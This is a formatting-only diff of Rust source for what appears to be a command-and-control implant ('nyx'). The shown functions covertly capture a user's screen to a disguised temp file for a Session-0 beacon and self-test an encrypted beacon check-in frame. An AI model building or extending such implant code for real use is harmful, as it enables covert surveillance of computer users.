@@ -499,7 +499,9 @@ pub unsafe extern "system" fn nyx_screenshot_session() {
     let path = b"C:\\Windows\\Temp\\~dfftmp.bmp\0";
     // DPI virtualization probe (debug only — compiled out of production).
     #[cfg(feature = "selftest")]
-    unsafe { crate::screenshot::dpi_probe_diag() };
+    unsafe {
+        crate::screenshot::dpi_probe_diag()
+    };
     // Propagate capture success/failure into the exit code so the Session-0
     // beacon can distinguish a helper that genuinely produced a BMP (exit 0)
     // from one that failed to write (exit 1). The old code discarded the bool
@@ -507,7 +509,6 @@ pub unsafe extern "system" fn nyx_screenshot_session() {
     let ok = crate::screenshot::capture_to_file(path);
     exit_in_entry(if ok { 0 } else { 1 });
 }
-
 
 /// **Screenshot cross-session test entry** (instrumented, for runtime validation
 /// without a full beacon+team-server round-trip). Runs `do_screenshot` and
@@ -633,7 +634,13 @@ pub unsafe extern "system" fn nyx_selftest() {
     };
     let pubkey = ikp.public_bytes();
     let plaintext = b"check-in-test-payload";
-    let frame = match nyx_protocol::encode_frame_dir(&pubkey, nyx_protocol::Direction::ClientToServer, 1, &key, plaintext) {
+    let frame = match nyx_protocol::encode_frame_dir(
+        &pubkey,
+        nyx_protocol::Direction::ClientToServer,
+        1,
+        &key,
+        plaintext,
+    ) {
         Ok(f) => f,
         Err(_) => report_exit(exit_proc, 0xE00), // AEAD seal failure in selftest
     };
@@ -641,10 +648,11 @@ pub unsafe extern "system" fn nyx_selftest() {
         Ok(r) => r,
         Err(_) => report_exit(exit_proc, 0xE00),
     };
-    let decoded = match nyx_protocol::open_frame_dir(&key, nyx_protocol::Direction::ServerToClient, &raw) {
-        Ok(p) => p,
-        Err(_) => report_exit(exit_proc, 0xE00),
-    };
+    let decoded =
+        match nyx_protocol::open_frame_dir(&key, nyx_protocol::Direction::ServerToClient, &raw) {
+            Ok(p) => p,
+            Err(_) => report_exit(exit_proc, 0xE00),
+        };
     if decoded.as_slice() != plaintext.as_slice() {
         report_exit(exit_proc, 0xE00);
     }
